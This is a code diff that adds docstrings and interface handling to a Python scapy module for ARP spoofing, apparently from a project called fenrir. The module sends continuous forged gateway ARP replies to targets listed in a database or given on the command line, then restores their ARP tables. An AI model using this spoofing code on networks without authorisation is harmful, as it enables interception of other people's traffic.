@@ -10,14 +10,25 @@ from argparse import ArgumentParser
 from signal import signal, SIGINT, SIGTERM
 
 
-def getmac(targetip, interface):
+def getmac(targetip, interface) -> str:
+    """ get macadress from given ipadress and interface
+    
+    :param targetip: -- IP to get MAC Address from
+    :param interface: -- interface to get MAC Address for IP
+    :returns mac address
+    """
     arppacket = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=targetip)
     targetmac = srp(arppacket, timeout=2, iface=interface,
                     verbose=False)[0][0][1].hwsrc
     return targetmac
 
 
-def getmydefaultgws(allowedinterface=None):
+def getmydefaultgws(allowedinterface=None) -> dict:
+    """ get mac address(es) for default GWs
+    
+    :param allowedinterface: limit GW detection to give interface name
+    :returns dict of Gateways and MAC Addresses
+    """
     ip = IPRoute()
     interfacedata = IPDB().interfaces
     defaultgws = dict()
@@ -34,28 +45,61 @@ def getmydefaultgws(allowedinterface=None):
 
 
 class Arper:
+    """ class to contain all ARP related methods
+    
+    Handles all ARP related stuff.
+    Spoofing, Scanning etc. Also available from config.
+    
+    """
     def __init__(self, interface='eth0', dbpath='/var/cache/fenrir/') -> None:
+        """ initialization
+        
+        :param interface: interface where ARP action happens (default: eth0)
+        ss:param dbpath: path where config databases are located (/var/cache/fenrir)
+        """
         self.settingsdbpath = dbpath + 'settings.sqlite'
         self.interface = interface
         self.looptime = 200
         self.endnow = False
 
     def doend(self, signum, frame) -> None:
+        """ end ARP loop
+        
+        sets stop flag. To-be-called via signal
+        """
         self.endnow = True
 
-    @staticmethod
-    def spoofarpcache(targetip, targetmac, sourceip) -> None:
+    def spoofarpcache(self, targetip, targetmac, sourceip) -> None:
+        """ send arp spoofing packet created from given parameters
+        
+        :param targetip: IP Address of targed to be spoofed
+        :param targetmac: MAC Address of target to be spoofed
+        :param sourceip: assumed IP of default GW for given targetip:
+        """
+        # op=2 is ARP Answer => unsolicitated ARP
         spoofed = ARP(op=2, pdst=targetip, psrc=sourceip, hwdst=targetmac)
-        send(spoofed, iface='eth0', verbose=False)
+        send(spoofed, iface=self.interface, verbose=False)
 
-    @staticmethod
-    def restorearp(targetip, targetmac, sourceip, sourcemac) -> None:
+    def restorearp(self, targetip, targetmac, sourceip, sourcemac) -> None:
+        """ restore original ARP table on given targetip:
+        
+        :param targetip: IP Address of targed to be spoofed
+        :param targetmac: MAC Address of target to be spoofed
+        :param sourceip: assumed IP of default GW for given targetip:
+        :param sourcemac: assumed MAC of default GW for given targetip:
+        """
+        # op=2 is ARP Answer => unsolicitated ARP
         packet = ARP(op=2, hwsrc=sourcemac, psrc=sourceip,
                      hwdst=targetmac, pdst=targetip)
-        send(packet, iface='eth0', verbose=False)
+        send(packet, iface=self.interface, verbose=False)
         debug(f'ARP Table restored to normal for {targetip}')
 
     def getspoofipsfromsettings(self, current):
+        """ get IPs to be spoofed from config file
+        
+        :param current: currently spoofed IP addresses
+        :returns tuple of no-longer-to-be-spoofed IPs and to-be-spoofed-IPs
+        """
         newmacs = set()
         cooloff = set()
         try:
@@ -70,6 +114,13 @@ class Arper:
         return cooloff, newmacs
 
     def spoofipsfromconfig(self)  -> None:
+        """ continuously spoof IPs in config Database 
+        
+        initially get MAC Addresses and IP Addresses of current default GWs
+        continuously (until END flag is set via signal) send spoof packets to IPs configured in database
+        send phaseout packets to no-longer-spoofed addresses to restore original MAC - GW.
+        do spoof every second for all configured IPs 
+        """
         sendspoof = dict()
         sendcooloff = dict()
         gwdict = getmydefaultgws(self.interface)
@@ -101,7 +152,7 @@ class Arper:
                     debug(f'send spoof of {gw} to {ip} (MAC: {mac}')
                     self.spoofarpcache(ip, mac, gw)
 
-            # restore original MAC to face-out IPs and remove once countdown expires
+            # restore original MAC to phaseout IPs and remove once countdown expires
             coolofexpired = list()
             for ip, macdelaylist in sendcooloff.items():
                 for gwip, gwmac in gwdict.items():
@@ -123,6 +174,13 @@ class Arper:
                 sleep(sleeptime / 1000)
 
     def spoofips(self, ips=[], gwips=[]) -> None:
+        """ spoof given ips to given gwips
+        
+        continously spoof given ips until manualy aborted from keyboard
+        execute arp every given self.looptime milliseconds independed of execution time
+        :param ips: ips to send spoof packets to
+        :param gwips: spoof gwips
+        """
         info(f'start spoofing for {", ".join(ips)}')
         ipmacs = list()
         for ip in ips:
@@ -152,6 +210,12 @@ class Arper:
                     self.restorearp(dstip, ipmacs[i], gwip, gwmac)
 
     def run(self, targetip=None) -> None:
+        """ run ARP spoofing 
+
+        :param targetip: use targetio as target for ARP spoofing
+        wait until interface is ready before starting spoofing
+        when no targetip is given spoof ips from config
+        """
         signal(SIGINT, self.doend)
         signal(SIGTERM, self.doend)
         # check if interface is present und up
@@ -175,11 +239,21 @@ class Arper:
 
 
 def arper(interface='eth0', targetip=None) -> None:
+    """ start aprp spoofing with given parameters
+    
+    :param interface: interface where spoofing is done
+    :param targetip: given IP to spoof  
+    """
     info('statring arping...')
     Arper(interface=interface).run(targetip=targetip)
 
 
 def main() -> None:
+    """ main method
+    
+    initialize logging 
+    parse given commandline arguments
+    """
     basicConfig(stream=stdout, level=INFO)
     parser = ArgumentParser()
     parser.add_argument('--targetip', help='exit after first completed scan')
